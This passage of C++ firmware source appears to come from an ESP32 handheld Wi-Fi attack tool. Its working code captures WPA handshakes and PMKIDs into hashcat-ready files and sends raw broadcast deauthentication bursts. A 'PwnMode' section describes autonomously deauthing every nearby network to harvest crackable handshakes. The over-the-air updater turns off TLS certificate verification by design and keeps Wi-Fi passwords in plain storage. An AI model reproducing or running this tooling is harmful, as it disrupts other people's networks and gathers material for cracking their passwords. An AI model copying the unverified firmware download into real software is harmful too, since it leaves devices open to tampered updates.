  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;
  framesSeen++;

  uint8_t fc0 = p[0];
  uint8_t fc1 = p[1];
  uint8_t frame_type = (fc0 >> 2) & 0x3;
  uint8_t subtype    = (fc0 >> 4) & 0xF;
  if (frame_type != 2) return;  // data only

  bool isQoS = (subtype & 0x08) != 0;
  int hdrLen = isQoS ? 26 : 24;
  if (len < hdrLen + 8) return;

  bool toDS   = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;
  const uint8_t* dst   = nullptr;
  const uint8_t* src   = nullptr;
  const uint8_t* bssid = nullptr;
  if      (!toDS && !fromDS) { dst = p + 4;  src = p + 10; bssid = p + 16; }
  else if (!toDS &&  fromDS) { dst = p + 4;  bssid = p + 10; src = p + 16; }
  else if ( toDS && !fromDS) { bssid = p + 4; src = p + 10; dst = p + 16; }
  else { return; }

  if (memcmp(bssid, targetBssid, 6) != 0) return;

  // SNAP: AA AA 03 00 00 00 88 8E for EAPOL
  const uint8_t* snap = p + hdrLen;
  if (snap[0] != 0xAA || snap[1] != 0xAA || snap[2] != 0x03) return;
  if (snap[6] != 0x88 || snap[7] != 0x8E) return;

  const uint8_t* eapol = snap + 8;
  int eapolLen = len - hdrLen - 8;
  if (eapolLen < 99) return;
  if (eapol[1] != 0x03) return;                                   // EAPOL-Key
  if (eapol[4] != 0x02 && eapol[4] != 0xFE) return;               // RSN or WPA
  eapolSeen++;

  uint16_t keyInfo = ((uint16_t)eapol[5] << 8) | eapol[6];
  bool kiKeyType = (keyInfo & 0x0008) != 0;
  bool kiInstall = (keyInfo & 0x0040) != 0;
  bool kiKeyAck  = (keyInfo & 0x0080) != 0;
  bool kiMic     = (keyInfo & 0x0100) != 0;
  if (!kiKeyType) return;

  bool isM1 = kiKeyAck && !kiMic && !kiInstall;
  bool isM2 = !kiKeyAck && kiMic && !kiInstall;

  const uint8_t* nonce = &eapol[17];
  uint16_t kdLen = ((uint16_t)eapol[97] << 8) | eapol[98];

  if (isM1) {
    const uint8_t* client = dst;
    InFlight* s = allocInflightForClient(client);
    memcpy(s->anonce, nonce, 32);
    s->has_m1 = true;
    if (kdLen > 0 && (int)kdLen <= eapolLen - 99) {
      uint8_t pmkid[16];
      if (extractPmkidFromKeyData(&eapol[99], kdLen, pmkid) && sdReady) {
        writePmkid22000(pmkid, client);
      }
    }
  } else if (isM2) {
    const uint8_t* client = src;
    InFlight* s = findInflightForClient(client);
    if (!s) return;
    if (eapolLen > (int)sizeof(s->m2_eapol)) return;
    memcpy(s->m2_eapol, eapol, eapolLen);
    s->m2_eapol_len = eapolLen;
    s->has_m2 = true;
    if (sdReady) writeHandshake22000(*s);
    memset(s, 0, sizeof(*s));
  }
}

// ──────────────── Deauth burst (manual) ────────────────
static void sendDeauthBurst() {
  uint8_t f[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x00, 0x00, 0x07, 0x00
  };
  memcpy(&f[10], targetBssid, 6);
  memcpy(&f[16], targetBssid, 6);
  for (int i = 0; i < 24; i++) {
    Deauther::wsl_bypasser_send_raw_frame(f, sizeof(f));
    delayMicroseconds(1500);
  }
}

// ──────────────── UI ────────────────
static void drawPickerList() {
  tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
  tft.setTextFont(2);
  tft.setTextSize(1);
  tft.setTextColor(GREEN, TFT_BLACK);
  tft.setCursor(10, 50);
  tft.println("Handshake Capture");
  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setCursor(10, 50);

  if (apCount == 0) {
    tft.setTextColor(ORANGE, TFT_BLACK);
    tft.setCursor(10, HSCAP_LIST_TOP_Y);
    tft.println("No networks found.");
    tft.setCursor(10, HSCAP_LIST_TOP_Y + 14);
    tft.println("Press SELECT to exit.");
    return;
  }

  int totalPages = (apCount + HSCAP_APS_PER_PG - 1) / HSCAP_APS_PER_PG;
  if (listPage < 0) listPage = 0;
  if (listPage > totalPages - 1) listPage = totalPages - 1;
  int start = listPage * HSCAP_APS_PER_PG;
  int end_  = start + HSCAP_APS_PER_PG;
  if (end_ > apCount) end_ = apCount;

  char pg[16];
  snprintf(pg, sizeof(pg), "Pg %d/%d", listPage + 1, totalPages);
  tft.setCursor(180, 50);
  tft.setTextColor(GREEN, TFT_BLACK);
  tft.print(pg);

  int y = HSCAP_LIST_TOP_Y;
  for (int i = start; i < end_; i++) {
    tft.fillRect(0, y, 240, HSCAP_LIST_ROW_H, TFT_BLACK);
    tft.setTextColor((i == listCursor) ? ORANGE : WHITE, TFT_BLACK);
    tft.setCursor(2, y); tft.print((i == listCursor) ? ">" : " ");
    char ssid12[12];
    strncpy(ssid12, apList[i].ssid, 11);
    ssid12[11] = '\0';
    if (strlen(apList[i].ssid) > 11) strcat(ssid12, "...");
    char row[64];
    snprintf(row, sizeof(row), "%02d %-12s %3d Ch%2d",
             i + 1, ssid12, apList[i].rssi, apList[i].channel);
    tft.setCursor(10, y);
    tft.print(row);
    y += HSCAP_LIST_ROW_H;
  }

  tft.fillRect(0, 304, 240, 16, TFT_BLACK);
  tft.drawFastHLine(0, 303, 240, ORANGE);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(8, 308);   tft.print("UP/DOWN");
  tft.setCursor(95, 308);  tft.print("RIGHT=CAPTURE");
  tft.setCursor(190, 308); tft.print("SEL=BACK");
}

static void drawCaptureHud(bool full) {
  if (full) {
    tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
    tft.setTextFont(2);
    tft.setTextSize(1);
    tft.setTextColor(GREEN, TFT_BLACK);
    tft.setCursor(10, 50);
    tft.println("Capturing...");
    tft.setTextColor(WHITE, TFT_BLACK);
    char buf[64];
    tft.setCursor(10, 70);
    snprintf(buf, sizeof(buf), "AP:    %.20s", targetSsid);
    tft.print(buf);
    tft.setCursor(10, 86);
    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             targetBssid[0], targetBssid[1], targetBssid[2],
             targetBssid[3], targetBssid[4], targetBssid[5]);
    tft.print(buf);
    tft.setCursor(10, 102);
    snprintf(buf, sizeof(buf), "CH:    %u", targetChannel);
    tft.print(buf);

    tft.fillRect(0, 304, 240, 16, TFT_BLACK);
    tft.drawFastHLine(0, 303, 240, ORANGE);
    tft.setTextColor(ORANGE, TFT_BLACK);
    tft.setCursor(8, 308);   tft.print("RIGHT=DEAUTH");
    tft.setCursor(170, 308); tft.print("SEL=BACK");
  }

  tft.fillRect(10, 140, 220, 90, TFT_BLACK);
  char buf[64];
  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setCursor(10, 140);
  snprintf(buf, sizeof(buf), "PMKIDs:     %lu", (unsigned long)pmkidCount);
  tft.println(buf);
  tft.setCursor(10, 160);
  snprintf(buf, sizeof(buf), "Handshakes: %lu", (unsigned long)handshakeCount);
  tft.println(buf);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(10, 180);
  snprintf(buf, sizeof(buf), "frames:     %lu", (unsigned long)framesSeen);
  tft.println(buf);
  tft.setCursor(10, 196);
  snprintf(buf, sizeof(buf), "EAPOL:      %lu", (unsigned long)eapolSeen);
  tft.println(buf);
  tft.setCursor(10, 216);
  tft.setTextColor(sdReady ? GREEN : ORANGE, TFT_BLACK);
  tft.println(sdReady ? "SD: writing /captures/handshakes.22000"
                      : "SD: NOT READY (no card?)");
}

// ──────────────── Scan + setup/loop/exit ────────────────
static void doRescan() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);

  int n = WiFi.scanNetworks(false, true);
  if (n < 0) { apCount = 0; return; }
  if (n > HSCAP_MAX_APS) n = HSCAP_MAX_APS;
  apCount = n;

  static String scratch;
  scratch.reserve(34);
  for (int i = 0; i < n; i++) {
    uint8_t enc = 0; int32_t rssi = 0; uint8_t* bssid = nullptr; int32_t ch = 0;
    scratch = "";
    if (WiFi.getNetworkInfo((uint8_t)i, scratch, enc, rssi, bssid, ch)) {
      strncpy(apList[i].ssid, scratch.c_str(), 32);
    } else {
      apList[i].ssid[0] = '\0';
    }
    apList[i].ssid[32] = '\0';
    if (bssid) memcpy(apList[i].bssid, bssid, 6);
    else       memset(apList[i].bssid, 0, 6);
    apList[i].rssi    = (int8_t)rssi;
    apList[i].channel = (uint8_t)ch;
  }
}

void hscapSetup() {
  state = State::PICKING;
  listCursor = 0;
  listPage = 0;
  pmkidCount = 0;
  handshakeCount = 0;
  framesSeen = 0;
  eapolSeen = 0;
  resetInflight();

  sdReady = (SD.cardSize() > 0);

  tft.fillScreen(UI_BG);
  drawStatusBar(readBatteryVoltage(), true);
  tft.setTextFont(2);
  tft.setTextSize(1);
  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setCursor(10, HSCAP_LIST_TOP_Y);
  tft.println("Scanning networks...");

  doRescan();
  drawPickerList();
}

static void startCapture() {
  ApItem& t = apList[listCursor];
  memcpy(targetBssid, t.bssid, 6);
  memcpy(targetSsid,  t.ssid, 33);
  targetChannel = t.channel;

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&rxCallback);
  esp_wifi_set_promiscuous(true);

  state = State::CAPTURING;
  drawCaptureHud(true);
}

static void stopCapture() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
}

void hscapLoop() {
  uint32_t now = millis();

  if (state == State::PICKING) {
    if (apCount == 0) {
      if (isButtonPressed(BTN_SELECT)) feature_exit_requested = true;
      delay(50);
      return;
    }
    if (now - lastBtnMs < 180) { delay(20); return; }
    if (!pcf.digitalRead(BTN_UP)) {
      lastBtnMs = now;
      if (listCursor > 0) listCursor--;
      listPage = listCursor / HSCAP_APS_PER_PG;
      drawPickerList();
    } else if (!pcf.digitalRead(BTN_DOWN)) {
      lastBtnMs = now;
      if (listCursor < apCount - 1) listCursor++;
      listPage = listCursor / HSCAP_APS_PER_PG;
      drawPickerList();
    } else if (!pcf.digitalRead(BTN_RIGHT)) {
      lastBtnMs = now;
      startCapture();
    } else if (isButtonPressed(BTN_SELECT)) {
      feature_exit_requested = true;
    }
  } else {  // CAPTURING
    if (now - lastHudMs > 500) {
      lastHudMs = now;
      drawCaptureHud(false);
    }
    if (now - lastBtnMs < 180) { delay(20); return; }
    if (!pcf.digitalRead(BTN_RIGHT)) {
      lastBtnMs = now;
      sendDeauthBurst();
      // restore channel + promiscuous after the deauth tx
      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    } else if (isButtonPressed(BTN_SELECT)) {
      stopCapture();
      feature_exit_requested = true;
    }
  }
}

void hscapExit() {
  stopCapture();
  state = State::PICKING;
}

}  // namespace HandshakeCapture

/* ════════════════════════════════════════════════════════════════════════════
   OtaGithub — pull the latest release from github.com/darkLabz001/Dark-Div
   and flash it over HTTPS using the Arduino Update library.

   Flow:
     1. Load saved Wi-Fi creds from NVS ("ota" namespace).  If missing,
        prompt for SSID + password via the existing showOnScreenKeyboard().
        Persist for next time.
     2. WiFi.mode(STA), WiFi.begin, wait up to ~15s for IP.
     3. HTTPS GET https://api.github.com/repos/darkLabz001/Dark-Div/releases/latest.
        Stream-parse the JSON to find the first asset whose name ends in
        ".bin" — that's our firmware.
     4. HTTPS GET the asset's browser_download_url (follows the 302 to S3).
        Pipe the response stream into Update.writeStream().
     5. On success: Update.end(true), show "OK rebooting...", ESP.restart().
        On failure at any step: show the error on-screen, wait, return so
        AppSettingsUI can resume.

   Cert pinning is intentionally skipped (setInsecure()) — adding a CA
   bundle is ~3 KB of code we can pay for once OTA is otherwise working.
   ════════════════════════════════════════════════════════════════════════════ */
#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include <ArduinoJson.h>

namespace OtaGithub {

static const char* REPO          = "darkLabz001/Dark-Div";
static const char* RELEASES_URL  = "https://api.github.com/repos/darkLabz001/Dark-Div/releases/latest";
static const char* PREF_NS       = "ota";

// ── UI helpers ──────────────────────────────────────────────────────────────
static const uint16_t ARA_RED  = 0xE0E6;   // ~ rgb(220,30,40) in RGB565
static const uint16_t ARA_DIM  = 0x6020;   // dim red
static int statusY = 0;

static void drawShell() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextFont(2);
  tft.setTextSize(2);
  tft.setTextColor(ARA_RED, TFT_BLACK);
  tft.setCursor(20, 14);
  tft.print("[ OTA UPDATE ]");
  tft.drawFastHLine(10, 40, 220, ARA_RED);
  tft.setTextSize(1);
  tft.setTextColor(ARA_DIM, TFT_BLACK);
  tft.setCursor(20, 46);
  tft.print(REPO);
  tft.drawFastHLine(10, 64, 220, ARA_DIM);
  statusY = 80;
}

static void status(const char* msg, uint16_t color = 0) {
  if (color == 0) color = ARA_RED;
  // Clear a few lines, scroll forward
  tft.fillRect(0, statusY, 240, 16, TFT_BLACK);
  tft.setTextFont(2);
  tft.setTextSize(1);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(10, statusY);
  tft.print("> ");
  tft.print(msg);
  statusY += 16;
  if (statusY > 270) {
    // Reset to top of status area
    tft.fillRect(0, 76, 240, 220, TFT_BLACK);
    statusY = 80;
  }
}

static void statusf(const char* fmt, ...) {
  char buf[80];
  va_list ap; va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  status(buf);
}

// ── NVS-backed Wi-Fi creds (shared with WifiSetup) ──────────────────────────
// PREF_NS is kept as "ota" for backwards compat with existing installs.
static bool loadCreds(String& ssid, String& pw) {
  Preferences p;
  if (!p.begin(PREF_NS, true)) return false;
  ssid = p.getString("ssid", "");
  pw   = p.getString("pw", "");
  p.end();
  return ssid.length() > 0;
}

static void saveCreds(const String& ssid, const String& pw) {
  Preferences p;
  if (!p.begin(PREF_NS, false)) return;
  p.putString("ssid", ssid);
  p.putString("pw",   pw);
  p.end();
}

// Exposed to WifiSetup below.
bool _loadCreds(String& ssid, String& pw) { return loadCreds(ssid, pw); }
void _saveCreds(const String& ssid, const String& pw) { saveCreds(ssid, pw); }

// ── Keyboard prompts ────────────────────────────────────────────────────────
static const char* kbdRowsUpper[] = {"1234567890", "QWERTYUIOP", "ASDFGHJKL", "ZXCVBNM"};
static const char* kbdRowsLower[] = {"1234567890", "qwertyuiop", "asdfghjkl", "zxcvbnm"};
static const char* kbdShuffles[]  = {"UPPER", "lower"};

static bool promptText(const char* title1, const char* title2, String& out, bool isPassword) {
  OnScreenKeyboardConfig cfg = {};
  cfg.titleLine1     = title1;
  cfg.titleLine2     = title2;
  cfg.rows           = kbdRowsUpper;
  cfg.rowCount       = 4;
  cfg.maxLen         = 32;
  cfg.shuffleNames   = kbdShuffles;
  cfg.shuffleCount   = 2;
  cfg.buttonsY       = 280;
  cfg.backLabel      = "Back";
  cfg.middleLabel    = "Case";
  cfg.okLabel        = "OK";
  cfg.enableShuffle  = true;
  cfg.requireNonEmpty = !isPassword;
  cfg.emptyErrorMsg  = "Cannot be empty";
  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, out);
  if (r.accepted) { out = r.text; return true; }
  return false;
}

// ── Main flow ───────────────────────────────────────────────────────────────
void run() {
  drawShell();

  String ssid, pw;
  if (!loadCreds(ssid, pw)) {
    status("No Wi-Fi creds saved");
    status("Enter SSID...");
    delay(800);
    if (!promptText("Wi-Fi SSID", "Enter your network name", ssid, false)) {
      drawShell();
      status("Cancelled", TFT_RED);
      delay(1500);
      return;
    }
    drawShell();
    status("Enter password...");
    delay(500);
    pw = "";
    if (!promptText("Wi-Fi Password", "Enter your network password", pw, true)) {
      drawShell();
      status("Cancelled", TFT_RED);
      delay(1500);
      return;
    }
    saveCreds(ssid, pw);
    drawShell();
    status("Creds saved to NVS");
  } else {
    statusf("Saved SSID: %s", ssid.c_str());
  }

  status("Connecting WiFi...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  WiFi.begin(ssid.c_str(), pw.c_str());
  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED && (millis() - t0) < 15000) {
    delay(250);
  }
  if (WiFi.status() != WL_CONNECTED) {
    status("Wi-Fi failed (timeout)", TFT_RED);
    status("Hold SELECT to clear creds");
    delay(3000);
    return;
  }
  statusf("WiFi OK  %s", WiFi.localIP().toString().c_str());

  status("Fetching latest release...");
  WiFiClientSecure secure;
  secure.setInsecure();
  HTTPClient https;
  https.setUserAgent("Dark-Div-OTA");
  https.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
  https.setTimeout(15000);
  if (!https.begin(secure, RELEASES_URL)) {
    status("HTTPS begin failed", TFT_RED);
    delay(3000); return;
  }
  int code = https.GET();
  if (code != HTTP_CODE_OK) {
    statusf("API GET -> %d", code);
    https.end();
    delay(3000); return;
  }
  String body = https.getString();
  https.end();

  DynamicJsonDocument doc(16384);
  DeserializationError err = deserializeJson(doc, body);
  if (err) {
    statusf("JSON parse: %s", err.c_str());
    delay(3000); return;
  }
  String tag = (const char*)(doc["tag_name"] | "?");
  String binUrl;
  String binName;
  size_t binSize = 0;
  JsonArray assets = doc["assets"].as<JsonArray>();
  for (size_t i = 0; i < assets.size(); i++) {
    auto a = assets[i];
    const char* name = a["name"] | "";
    if (name[0] == '\0') continue;
    String n(name);
    if (n.endsWith(".bin")) {
      binUrl  = (const char*)(a["browser_download_url"] | "");
      binName = n;
      binSize = (size_t)(a["size"] | 0);
      break;
    }
  }
  if (binUrl.length() == 0) {
    status("No .bin asset in release", TFT_RED);
    delay(3000); return;
  }
  statusf("Release: %s", tag.c_str());
  statusf("Asset: %s (%u B)", binName.c_str(), (unsigned)binSize);

  status("Downloading...");
  WiFiClientSecure secure2;
  secure2.setInsecure();
  HTTPClient bin;
  bin.setUserAgent("Dark-Div-OTA");
  bin.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
  bin.setTimeout(30000);
  if (!bin.begin(secure2, binUrl)) {
    status("Bin HTTPS begin failed", TFT_RED);
    delay(3000); return;
  }
  code = bin.GET();
  if (code != HTTP_CODE_OK) {
    statusf("Bin GET -> %d", code);
    bin.end();
    delay(3000); return;
  }
  int contentLen = bin.getSize();
  if (contentLen <= 0) contentLen = (int)binSize;
  if (!Update.begin(contentLen > 0 ? contentLen : UPDATE_SIZE_UNKNOWN)) {
    statusf("Update.begin: %s", Update.errorString());
    bin.end();
    delay(3000); return;
  }

  WiFiClient* stream = bin.getStreamPtr();
  size_t written = 0;
  size_t lastReportPct = 0;
  uint8_t buf[1024];
  uint32_t lastByteMs = millis();
  while (bin.connected() && (contentLen == -1 || (int)written < contentLen)) {
    size_t avail = stream->available();
    if (avail) {
      int n = stream->readBytes(buf, avail > sizeof(buf) ? sizeof(buf) : avail);
      if (n > 0) {
        if (Update.write(buf, n) != (size_t)n) {
          statusf("Write fail: %s", Update.errorString());
          Update.abort();
          bin.end();
          delay(3000); return;
        }
        written += n;
        lastByteMs = millis();
        if (contentLen > 0) {
          size_t pct = (written * 100) / contentLen;
          if (pct >= lastReportPct + 10) {
            statusf("Wrote %u%% (%u/%u B)", (unsigned)pct, (unsigned)written, (unsigned)contentLen);
            lastReportPct = pct;
          }
        }
      }
    } else {
      if (millis() - lastByteMs > 10000) { status("Stream stalled", TFT_RED); Update.abort(); bin.end(); delay(3000); return; }
      delay(2);
    }
  }
  bin.end();

  if (!Update.end(true)) {
    statusf("Update.end: %s", Update.errorString());
    delay(4000); return;
  }
  if (Update.isFinished()) {
    status("OTA OK — rebooting...", TFT_GREEN);
    delay(1800);
    ESP.restart();
  } else {
    status("Update unfinished", TFT_RED);
    delay(3000);
  }
}

}  // namespace OtaGithub

/* ════════════════════════════════════════════════════════════════════════════
   WifiSetup — interactive scan + connect, persists creds for OtaGithub.
   ════════════════════════════════════════════════════════════════════════════ */
namespace OtaGithub {
  bool _loadCreds(String& ssid, String& pw);
  void _saveCreds(const String& ssid, const String& pw);
}

namespace WifiSetup {

static const uint16_t WS_RED  = 0xE0E6;
static const uint16_t WS_DIM  = 0x6020;
static const uint16_t WS_GRN  = 0x07C0;

static void shell(const char* title) {
  tft.fillScreen(TFT_BLACK);
  tft.setTextFont(2);
  tft.setTextSize(2);
  tft.setTextColor(WS_RED, TFT_BLACK);
  tft.setCursor(20, 14);
  tft.print(title);
  tft.drawFastHLine(10, 40, 220, WS_RED);
  tft.setTextSize(1);
}

static void msg(int y, const char* s, uint16_t color = 0) {
  if (color == 0) color = WS_RED;
  tft.fillRect(0, y, 240, 16, TFT_BLACK);
  tft.setTextFont(2);
  tft.setTextSize(1);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(10, y);
  tft.print(s);
}

static void msgf(int y, uint16_t color, const char* fmt, ...) {
  char buf[80];
  va_list ap; va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  msg(y, buf, color);
}

static bool promptText(const char* t1, const char* t2, String& out, bool isPw) {
  OnScreenKeyboardConfig cfg = {};
  cfg.titleLine1     = t1;
  cfg.titleLine2     = t2;
  static const char* up[] = {"1234567890", "QWERTYUIOP", "ASDFGHJKL", "ZXCVBNM"};
  static const char* lo[] = {"1234567890", "qwertyuiop", "asdfghjkl", "zxcvbnm"};
  static const char* sh[] = {"UPPER", "lower"};
  cfg.rows           = up;
  cfg.rowCount       = 4;
  cfg.maxLen         = 63;
  cfg.shuffleNames   = sh;
  cfg.shuffleCount   = 2;
  cfg.buttonsY       = 280;
  cfg.backLabel      = "Back";
  cfg.middleLabel    = "Case";
  cfg.okLabel        = "OK";
  cfg.enableShuffle  = true;
  cfg.requireNonEmpty = !isPw;
  cfg.emptyErrorMsg  = "Cannot be empty";
  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, out);
  if (r.accepted) { out = r.text; return true; }
  return false;
}

static const char* authShort(wifi_auth_mode_t a) {
  switch (a) {
    case WIFI_AUTH_OPEN:           return "open";
    case WIFI_AUTH_WEP:            return "WEP";
    case WIFI_AUTH_WPA_PSK:        return "WPA";
    case WIFI_AUTH_WPA2_PSK:       return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:   return "WPA/2";
    case WIFI_AUTH_WPA3_PSK:       return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:  return "WPA2/3";
    default:                       return "?";
  }
}

// Draw the scan list. Highlights `sel` (0-based into networks[0..n-1]).
static void drawList(int n, int sel, int scroll, int maxRows) {
  tft.fillRect(0, 50, 240, 240, TFT_BLACK);
  tft.setTextFont(2);
  tft.setTextSize(1);
  for (int row = 0; row < maxRows && (scroll + row) < n; row++) {
    int i = scroll + row;
    int y = 54 + row * 18;
    bool active = (i == sel);
    if (active) {
      tft.fillRect(4, y - 2, 232, 17, WS_DIM);
    }
    int rssi = WiFi.RSSI(i);
    char line[42];
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) ssid = "<hidden>";
    if (ssid.length() > 18) ssid = ssid.substring(0, 18);
    snprintf(line, sizeof(line), "%-18s %4d %s",
             ssid.c_str(), rssi, authShort(WiFi.encryptionType(i)));
    tft.setTextColor(active ? WHITE : WS_RED, active ? WS_DIM : TFT_BLACK);
    tft.setCursor(8, y);
    tft.print(line);
  }
  // Footer hint
  tft.setTextColor(WS_DIM, TFT_BLACK);
  tft.setCursor(8, 300);
  tft.print("UP/DN  tap SEL=pick  hold=back");
}

// Block until SELECT is released, so a long-hold latch doesn't fire again
// in whatever screen we return to.
static void drainSelect() {
  while (isButtonPressed(BTN_SELECT)) delay(20);
  // Also clear any pending short-tap so it doesn't fire in the caller.
  (void)isSelectShortTapped();
}

void run() {
  shell("[ WIFI SETUP ]");
  msg(50, "Scanning...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  delay(50);

  int n = WiFi.scanNetworks(false /*async*/, true /*show hidden*/);
  if (n <= 0) {
    msg(50, "No networks found", TFT_RED);
    msg(70, "Hold SELECT to exit");
    while (!isButtonPressed(BTN_SELECT)) delay(50);
    drainSelect();
    return;
  }

  shell("[ WIFI SETUP ]");
  int sel = 0;
  const int maxRows = 12;
  int scroll = 0;
  drawList(n, sel, scroll, maxRows);

  bool upPrev = false, downPrev = false, leftPrev = false;
  for (;;) {
    bool up    = isButtonPressed(BTN_UP);
    bool down  = isButtonPressed(BTN_DOWN);
    bool left  = isButtonPressed(BTN_LEFT);

    // LEFT or long-hold SELECT = back to settings.
    if (left && !leftPrev) {
      WiFi.scanDelete();
      return;
    }
    if (isButtonPressed(BTN_SELECT)) {
      drainSelect();
      WiFi.scanDelete();
      return;
    }
    if (up && !upPrev) {
      if (sel > 0) sel--;
      if (sel < scroll) scroll = sel;
      drawList(n, sel, scroll, maxRows);
    }
    if (down && !downPrev) {
      if (sel < n - 1) sel++;
      if (sel >= scroll + maxRows) scroll = sel - maxRows + 1;
      drawList(n, sel, scroll, maxRows);
    }
    // Short SELECT tap = pick this network.
    if (isSelectShortTapped()) {
      break;
    }
    upPrev = up; downPrev = down; leftPrev = left;
    delay(30);
  }

  String ssid = WiFi.SSID(sel);
  wifi_auth_mode_t auth = WiFi.encryptionType(sel);
  WiFi.scanDelete();

  if (ssid.length() == 0) {
    shell("[ WIFI SETUP ]");
    msg(50, "Hidden SSID — type it");
    delay(800);
    if (!promptText("Hidden SSID", "Type the network name", ssid, false)) return;
  }

  String pw = "";
  if (auth != WIFI_AUTH_OPEN) {
    shell("[ WIFI SETUP ]");
    msgf(50, WS_RED, "SSID: %s", ssid.c_str());
    msg(70, "Enter password...");
    delay(500);
    if (!promptText("WiFi Password", ssid.c_str(), pw, true)) return;
  }

  shell("[ WIFI SETUP ]");
  msgf(50, WS_RED, "Connecting to %s", ssid.c_str());
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  WiFi.begin(ssid.c_str(), pw.c_str());

  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED && (millis() - t0) < 15000) {
    delay(250);
    msgf(70, WS_DIM, "  state=%d  %lus", (int)WiFi.status(), (unsigned long)((millis() - t0) / 1000));
  }
  if (WiFi.status() != WL_CONNECTED) {
    msg(90, "Failed (timeout)", TFT_RED);
    msg(110, "Hold SELECT to exit");
    while (!isButtonPressed(BTN_SELECT)) delay(50);
    drainSelect();
    return;
  }

  OtaGithub::_saveCreds(ssid, pw);
  msgf(90, WS_GRN, "Connected  %s", WiFi.localIP().toString().c_str());
  msg(110, "Creds saved", WS_GRN);
  msg(140, "Hold SELECT to exit");
  while (!isButtonPressed(BTN_SELECT)) delay(50);
  drainSelect();
}

}  // namespace WifiSetup

/* ════════════════════════════════════════════════════════════════════════════
   PwnMode — Pwnagotchi-style autonomous handshake hunter.

   Same EAPOL / PMKID parsing as HandshakeCapture, but:
     - Walks channels 1..13 on a 5 s dwell.
     - Captures from EVERY BSSID it sees, not a single target.
     - Builds a BSSID -> SSID/channel table from beacons it sniffs along
       the way, so the hashcat-22000 records have the right ESSID.
     - Periodically fires a broadcast deauth at every BSSID on the current
       channel to provoke fresh M1/M2 sequences.
     - Shows an animated little face on the TFT whose mood depends on time
       since the last successful capture (idle / watching / happy / sad /
       angry-when-deauthing).
   RIGHT button: manual deauth burst now.   SELECT: exit.
   ════════════════════════════════════════════════════════════════════════════ */
namespace PwnMode {

static constexpr int PWN_MAX_BSSIDS         = 48;
static constexpr int PWN_INFLIGHT           = 8;
static constexpr int PWN_CHANNEL_DWELL_MS   = 5000;
static constexpr int PWN_DEAUTH_INTERVAL_MS = 45000;
static constexpr int PWN_FACE_HAPPY_MS      = 6000;     // bright after capture
static constexpr int PWN_FACE_SAD_MS        = 120000;   // goes sad after 2 min dry

struct BssidEntry {
  uint8_t bssid[6];
  char    ssid[33];
  uint8_t channel;
};
struct InFlight {
  uint8_t bssid[6];
  uint8_t client[6];
  uint8_t anonce[32];
  uint8_t m2_eapol[256];
  int     m2_eapol_len;
  bool    has_m1;
  bool    has_m2;
};
enum class Face { IDLE, WATCH, HAPPY, SAD, ANGRY };

static BssidEntry bssidTbl[PWN_MAX_BSSIDS];
static int        bssidCount = 0;
static InFlight   inflight[PWN_INFLIGHT];
static int        inflightNext = 0;

static volatile uint32_t pmkidCount     = 0;
static volatile uint32_t handshakeCount = 0;
static volatile uint32_t framesSeen     = 0;
static volatile uint32_t eapolSeen      = 0;
static volatile uint32_t beaconsSeen    = 0;
static uint8_t  currentChannel   = 1;
static uint32_t channelStartMs   = 0;
static uint32_t startMs          = 0;
static uint32_t lastCaptureMs    = 0;
static uint32_t lastDeauthMs     = 0;
static uint32_t lastFaceMs       = 0;
static uint32_t lastHudMs        = 0;
static Face     currentFace      = Face::IDLE;
static Face     lastDrawnFace    = (Face)(-1);
static bool     sdReady          = false;
static bool     autoDeauth       = true;

// ── Persistent personality (SD /pwn/state.json) ──────────────────────────────
static constexpr const char* PWN_DIR        = "/pwn";
static constexpr const char* PWN_STATE_PATH = "/pwn/state.json";
static constexpr uint32_t    PWN_SAVE_MIN_MS = 5000;    // capture-driven debounce
static constexpr uint32_t    PWN_SAVE_HEARTBEAT_MS = 30000;

struct Persist {
  char     name[17];        // up to 16 chars + NUL
  uint32_t totalHandshakes;
  uint32_t totalPmkids;
  uint32_t totalUptimeS;    // cumulative across reboots
  uint32_t sessions;
  uint16_t bestSession;     // best (PMKID+handshake) count in a single session
};
static Persist  persist        = {};
static bool     persistDirty   = false;
static uint32_t lastSaveMs     = 0;
